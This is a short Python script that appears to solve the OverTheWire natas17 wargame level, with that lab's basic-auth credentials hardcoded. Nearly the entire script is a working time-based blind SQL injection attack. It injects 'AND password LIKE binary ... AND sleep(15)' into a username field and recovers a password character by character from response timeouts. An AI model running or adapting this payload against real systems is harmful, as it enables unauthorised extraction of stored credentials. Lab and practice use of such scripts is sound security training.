#!/usr/bin/python3.9

import requests

def cracker():
    print("Start Cracking ... ")
    ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    url = "http://natas17.natas.labs.overthewire.org/"
    basic_user="natas17"
    basic_password="8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
    auth = (basic_user, basic_password)
    passwd = ""
    while len(passwd) < 32:
        for c in ch:
            print(f"Checked --> {c}")
            try:
                query = f'natas18" AND password LIKE binary "{passwd}{c}%" AND sleep(15) # '
                data = {"username":query}
                res = requests.post(url, data=data, auth=auth, timeout=10)
            except Exception as e:
                passwd += c
                print(f"password --> {passwd}")
cracker()

